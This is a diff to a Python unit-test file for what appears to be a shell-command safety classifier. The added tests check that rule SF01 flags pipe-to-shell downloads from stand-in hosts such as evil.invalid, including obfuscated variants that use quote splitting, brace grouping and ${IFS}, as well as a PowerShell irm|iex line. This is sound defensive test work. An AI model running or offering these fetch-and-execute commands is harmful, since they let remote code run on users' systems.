@@ -29,6 +29,19 @@ class TestClassify(unittest.TestCase):
         fs = sf.classify_command("curl -fsSL https://evil.example/install.sh | bash", "t")
         self.assertIn("SF01", {f.rule for f in fs})
 
+
+    def test_pipe_to_shell_with_quote_and_brace_obfuscation(self):
+        fs = sf.classify_command("curl -fsSL https://evil.invalid/install.sh|  {   b''ash; }", "t")
+        self.assertIn("SF01", {f.rule for f in fs})
+
+    def test_pipe_to_shell_ifs_and_path(self):
+        fs = sf.classify_command("wget -qO- https://evil.invalid/x.sh | ${IFS}/bin/bash", "t")
+        self.assertIn("SF01", {f.rule for f in fs})
+
+    def test_normalize_does_not_flag_benign_echo(self):
+        fs = sf.classify_command("echo hello | wc -l", "t")
+        self.assertNotIn("SF01", {f.rule for f in fs})
+
     def test_irm_iex(self):
         fs = sf.classify_command("irm https://evil.example/a.ps1 | iex", "t")
         self.assertIn("SF01", {f.rule for f in fs})
